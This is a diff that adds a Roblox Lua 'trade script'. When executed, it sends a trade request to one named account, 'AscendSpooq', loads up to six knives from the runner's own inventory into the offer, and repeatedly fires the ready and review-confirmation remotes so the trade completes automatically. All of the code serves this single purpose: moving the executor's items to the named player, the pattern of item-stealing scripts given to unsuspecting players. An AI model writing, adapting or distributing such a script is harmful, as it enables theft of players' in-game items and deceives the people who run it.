@@ -1,0 +1,389 @@
+-- Combined Trade Script
+-- 1. Checks for "AscendSpooq" and sends trade request
+-- 2. Scans inventory for knives and offers them in trades
+-- 3. Spams trade ready status after offering knives
+-- 4. Spams trade review confirmation when the Trade Review screen is visible
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+
+-- Variables for trade request tracking
+local requestSent = false
+
+-- Variables for knife tracking
+local knifeOfferInProgress = false
+local lastKnifeRefresh = 0
+local refreshCooldown = 2 -- Reduced cooldown for faster response
+local maxKnivesPerOffer = 6
+local knifeOfferCount = 0 -- Track how many times we've offered knives in current trade
+local maxOfferAttempts = 2 -- Maximum number of times to offer knives in a trade
+
+-- Variable for trade status spamming
+local isSpammingTradeStatus = false
+local tradeStatusSpamInterval = 1 -- Seconds between trade status spams
+
+-- Variable for trade review spamming
+local isSpammingTradeReview = false
+local tradeReviewSpamInterval = 0.5 -- Seconds between trade review spams
+
+-- Forward-declare offerKnivesForTrade to fix the reference issue
+local offerKnivesForTrade
+
+-- Function to check if we're trading specifically with AscendSpooq
+local function isTradingWithAscendSpooq()
+    local success, result = pcall(function()
+        local tradeLabel = LocalPlayer.PlayerGui.ScreenGui.UI.TradeScreen.TextLabel
+        return tradeLabel and tradeLabel.Text == "Trading with AscendSpooq"
+    end)
+    
+    if not success then
+        print("Error checking trade partner: "..tostring(result))
+        return false
+    end
+    
+    if result then
+        print("Confirmed trading with AscendSpooq")
+    else
+        print("Not trading with AscendSpooq - trade operations disabled")
+    end
+    
+    return result
+end
+
+-- Function to check if the trade screen is actually visible
+local function isTradeScreenVisible()
+    local success, result = pcall(function()
+        local tradeScreen = LocalPlayer.PlayerGui.ScreenGui.UI.TradeScreen
+        return tradeScreen and tradeScreen.Visible
+    end)
+    
+    if not success then
+        print("Error checking trade screen visibility: "..tostring(result))
+        return false
+    end
+    
+    return result
+end
+
+-- Function to check if the trade review screen is visible
+local function isTradeReviewVisible()
+    local success, result = pcall(function()
+        local tradeReview = LocalPlayer.PlayerGui.ScreenGui.UI.TradeScreen.Frame.TradeReview
+        return tradeReview and tradeReview.Visible
+    end)
+    
+    if not success then
+        print("Error checking trade review visibility: "..tostring(result))
+        return false
+    end
+    
+    return result
+end
+
+-- Function to spam trade review confirmation
+local function spamTradeReview()
+    -- Only proceed if we're specifically trading with AscendSpooq
+    if not isTradeScreenVisible() or not isTradeReviewVisible() or not isTradingWithAscendSpooq() then
+        isSpammingTradeReview = false
+        print("Trade review operation cancelled - not in correct trade with AscendSpooq")
+        return
+    end
+    
+    if not isSpammingTradeReview then
+        print("Starting to spam trade REVIEW confirmation")
+        isSpammingTradeReview = true
+    end
+    
+    print("Sending trade review confirmation...")
+    
+    local success, errorMsg = pcall(function()
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("UpdTradeReview"):FireServer()
+    end)
+    
+    if success then
+        print("Trade review confirmation sent")
+    else
+        print("Failed to send trade review: " .. tostring(errorMsg))
+    end
+end
+
+-- Function to get available knives from inventory
+local function getInventoryKnives()
+    local knives = {}
+    
+    local success, result = pcall(function()
+        local knifePath = LocalPlayer.PlayerGui.ScreenGui.UI.Inventory.KnifeInv.KnifeGrid
+        if not knifePath then
+            print("Knife inventory path not found. Is inventory open?")
+            return {}
+        end
+        
+        local foundKnives = {}
+        for _, child in pairs(knifePath:GetChildren()) do
+            if child:IsA("ImageButton") and child.Name ~= "Template" then
+                table.insert(foundKnives, child.Name)
+            end
+        end
+        
+        return foundKnives
+    end)
+    
+    if not success then
+        print("Error getting inventory knives: "..tostring(result))
+        return {}
+    end
+    
+    knives = result
+    print("Found " .. #knives .. " knives in inventory")
+    return knives
+end
+
+-- Function to count knives already in trade offer using CORRECT PATH
+local function getTradeOfferCount()
+    local count = 0
+    
+    local success, result = pcall(function()
+        local tradePath = LocalPlayer.PlayerGui.ScreenGui.UI.TradeScreen.Frame.TradeInfo.OfferInput
+        if not tradePath then
+            print("Trade offer path not found. Is trading active?")
+            return 0
+        end
+        
+        local foundCount = 0
+        for _, child in pairs(tradePath:GetChildren()) do
+            if child:IsA("ImageButton") then
+                foundCount = foundCount + 1
+                print("Found trade item: " .. child.Name)
+            end
+        end
+        
+        return foundCount
+    end)
+    
+    if not success then
+        print("Error counting trade offers: "..tostring(result))
+        return 0
+    end
+    
+    count = result
+    print("Found " .. count .. " items already in trade offer")
+    
+    if count >= maxKnivesPerOffer then
+        print("MAXIMUM ITEMS ALREADY IN TRADE - WILL NOT ADD MORE")
+    end
+    
+    return count
+end
+
+-- Function to spam trade status as ready
+local function spamTradeStatus()
+    -- Only proceed if we're specifically trading with AscendSpooq
+    if not isTradeScreenVisible() or not isTradingWithAscendSpooq() then
+        isSpammingTradeStatus = false
+        print("Trade status operation cancelled - not in correct trade with AscendSpooq")
+        return
+    end
+    
+    if not isSpammingTradeStatus then
+        print("Starting to spam trade status as READY")
+        isSpammingTradeStatus = true
+    end
+    
+    print("Sending trade ready status...")
+    
+    local success, errorMsg = pcall(function()
+        local args = {
+            [1] = true
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("UpdTradeStatus"):FireServer(unpack(args))
+    end)
+    
+    if success then
+        print("Trade status sent as READY")
+    else
+        print("Failed to update trade status: " .. tostring(errorMsg))
+    end
+end
+
+-- Function to check for player and send trade request
+local function checkForPlayer()
+    local targetPlayer = Players:FindFirstChild("AscendSpooq")
+    
+    if targetPlayer then
+        print("AscendSpooq is in the game!")
+        
+        if not requestSent then
+            requestSent = true
+            print("SENDING TRADE REQUEST TO ASCENDSPOOQ")
+            
+            local args = {
+                [1] = Players.AscendSpooq
+            }
+            
+            local remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SendTradeRequest")
+            remote:FireServer(unpack(args))
+            print("Trade request sent!")
+            
+            spawn(function()
+                wait(60)
+                if not isTradeScreenVisible() then
+                    print("Trade screen didn't appear in 60 seconds, resetting request flag")
+                    requestSent = false
+                end
+            end)
+        end
+    else
+        if requestSent then
+            print("AscendSpooq left the game, resetting request flag")
+            requestSent = false
+        end
+    end
+end
+
+-- Definition of offerKnivesForTrade
+offerKnivesForTrade = function()
+    -- Only proceed if we're specifically trading with AscendSpooq
+    if not isTradeScreenVisible() or not isTradingWithAscendSpooq() then
+        print("Knife offer cancelled - not in correct trade with AscendSpooq")
+        return
+    end
+    
+    if knifeOfferCount >= maxOfferAttempts then
+        print("Already offered knives " .. knifeOfferCount .. " times (max: " .. maxOfferAttempts .. ") - no more offers in this trade")
+        return
+    end
+    
+    if knifeOfferInProgress then
+        print("Knife offer already in progress")
+        return
+    end
+    
+    knifeOfferInProgress = true
+    
+    local knives = getInventoryKnives()
+    local currentOfferCount = getTradeOfferCount()
+    
+    if currentOfferCount >= maxKnivesPerOffer then
+        print("ALREADY HAVE " .. currentOfferCount .. " ITEMS IN TRADE (MAX: 6) - NOT ADDING MORE")
+        knifeOfferInProgress = false
+        return
+    end
+    
+    local remainingSlots = maxKnivesPerOffer - currentOfferCount
+    local knivesToOffer = {}
+    
+    for i = 1, math.min(remainingSlots, #knives) do
+        table.insert(knivesToOffer, knives[i])
+    end
+    
+    if #knivesToOffer == 0 then
+        print("No knives available to offer")
+        knifeOfferInProgress = false
+        return
+    end
+    
+    local args = {
+        [1] = {}
+    }
+    
+    for i, knifeName in ipairs(knivesToOffer) do
+        args[1][i] = {
+            [1] = knifeName,
+            [2] = 1
+        }
+    end
+    
+    local success, errorMsg = pcall(function()
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("UpdateTradeOffer"):FireServer(unpack(args))
+    end)
+    
+    if success then
+        knifeOfferCount = knifeOfferCount + 1
+        print("Successfully offered " .. #knivesToOffer .. " knives for trade (Offer #" .. knifeOfferCount .. " of " .. maxOfferAttempts .. ")")
+        
+        if knifeOfferCount >= maxOfferAttempts then
+            print("REACHED MAX OFFERS - STARTING TRADE STATUS SPAM")
+            spawn(function()
+                while isTradeScreenVisible() do
+                    spamTradeStatus()
+                    wait(tradeStatusSpamInterval)
+                end
+                isSpammingTradeStatus = false
+            end)
+        end
+    else
+        print("Failed to offer knives: " .. tostring(errorMsg))
+    end
+    
+    wait(1)
+    knifeOfferInProgress = false
+    lastKnifeRefresh = tick()
+end
+
+spawn(function()
+    print("TRADE REQUEST MONITOR STARTED")
+    while wait(2) do
+        checkForPlayer()
+    end
+end)
+
+spawn(function()
+    print("KNIFE OFFERING MONITOR STARTED")
+    local wasTradeScreenVisible = false
+    while wait(1) do
+        if isTradeScreenVisible() and isTradingWithAscendSpooq() then
+            if not wasTradeScreenVisible then
+                print("Trade with AscendSpooq is now active - resetting offer count")
+                knifeOfferCount = 0
+                isSpammingTradeStatus = false
+                wasTradeScreenVisible = true
+            end
+            
+            local currentCount = getTradeOfferCount()
+            
+            if knifeOfferCount < maxOfferAttempts and currentCount < maxKnivesPerOffer and tick() - lastKnifeRefresh > refreshCooldown then
+                print("Trade screen is visible with " .. currentCount .. "/6 items - attempt " .. (knifeOfferCount + 1) .. "/" .. maxOfferAttempts)
+                offerKnivesForTrade()
+            elseif knifeOfferCount >= maxOfferAttempts then
+                print("Already made " .. knifeOfferCount .. " offers in this trade session - now spamming READY status")
+                if not isSpammingTradeStatus then
+                    spamTradeStatus()
+                end
+            elseif currentCount >= maxKnivesPerOffer then
+                print("Trade already has maximum items (" .. currentCount .. "/6) - now spamming READY status")
+                if not isSpammingTradeStatus then
+                    spamTradeStatus()
+                end
+            end
+        else
+            wasTradeScreenVisible = false
+            isSpammingTradeStatus = false
+        end
+    end
+end)
+
+spawn(function()
+    print("TRADE STATUS SPAM MONITOR STARTED")
+    while wait(tradeStatusSpamInterval) do
+        if isTradeScreenVisible() and isTradingWithAscendSpooq() and (knifeOfferCount >= maxOfferAttempts or getTradeOfferCount() >= maxKnivesPerOffer) and not isSpammingTradeStatus then
+            spamTradeStatus()
+        end
+    end
+end)
+
+-- Add dedicated thread for trade review spamming
+spawn(function()
+    print("TRADE REVIEW SPAM MONITOR STARTED")
+    while wait(tradeReviewSpamInterval) do
+        -- Only run if we're specifically trading with AscendSpooq
+        if isTradeScreenVisible() and isTradeReviewVisible() and isTradingWithAscendSpooq() then
+            spamTradeReview()
+        else
+            isSpammingTradeReview = false
+        end
+    end
+end)
+
+print("===== TRADE SCRIPT INITIALIZED AND RUNNING! =====")
